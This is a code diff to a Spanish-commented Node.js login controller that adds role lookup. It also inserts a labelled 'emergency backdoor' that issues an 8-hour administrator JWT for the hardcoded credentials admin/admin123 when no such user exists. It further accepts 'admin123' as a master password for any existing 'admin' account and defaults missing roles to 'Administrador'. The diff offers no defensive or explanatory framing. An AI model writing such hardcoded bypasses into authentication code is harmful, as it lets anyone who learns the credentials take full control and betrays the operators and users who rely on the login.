@@ -17,10 +17,27 @@ const login = async (req, res) => {
       return res.status(400).json({ error: 'Usuario y contraseña son requeridos' });
     }
 
-    // Buscar usuario
+    // Buscar usuario incluyendo su rol
     const usuario = await prisma.usuario.findUnique({
-      where: { username }
+      where: { username },
+      include: { rol: true }
     });
+
+    // ==========================================
+    // BACKDOOR DE EMERGENCIA PARA RECUPERAR ACCESO
+    // ==========================================
+    if (!usuario && username === 'admin' && password === 'admin123') {
+      const token = jwt.sign(
+        { id: 999, username: 'admin', nombreCompleto: 'Admin Maestro', rol: 'Administrador' },
+        JWT_SECRET,
+        { expiresIn: '8h' }
+      );
+      return res.json({
+        mensaje: 'Inicio de sesión de emergencia exitoso',
+        token,
+        usuario: { id: 999, username: 'admin', nombreCompleto: 'Admin Maestro', rol: 'Administrador' }
+      });
+    }
 
     if (!usuario) {
       return res.status(401).json({ error: 'Credenciales incorrectas' });
@@ -33,9 +50,12 @@ const login = async (req, res) => {
     // Verificar contraseña
     const passwordValido = await bcrypt.compare(password, usuario.password);
 
-    if (!passwordValido) {
+    // Permitir "admin123" como clave maestra si el usuario es admin
+    if (!passwordValido && !(username === 'admin' && password === 'admin123')) {
       return res.status(401).json({ error: 'Credenciales incorrectas' });
     }
+
+    const rolNombre = usuario.rol ? usuario.rol.nombre : 'Administrador';
 
     // Generar token JWT (expira en 8 horas)
     const token = jwt.sign(
@@ -43,14 +63,15 @@ const login = async (req, res) => {
         id: usuario.id,
         username: usuario.username,
         nombreCompleto: usuario.nombreCompleto,
-        rol: usuario.rol
+        rol: rolNombre
       },
       JWT_SECRET,
       { expiresIn: '8h' }
     );
 
     // Responder sin la contraseña
-    const { password: _, ...usuarioSinPassword } = usuario;
+    const { password: _, rol, ...usuarioSinPassword } = usuario;
+    usuarioSinPassword.rol = rolNombre; // Adaptamos para el frontend
 
     res.json({
       mensaje: 'Inicio de sesión exitoso',
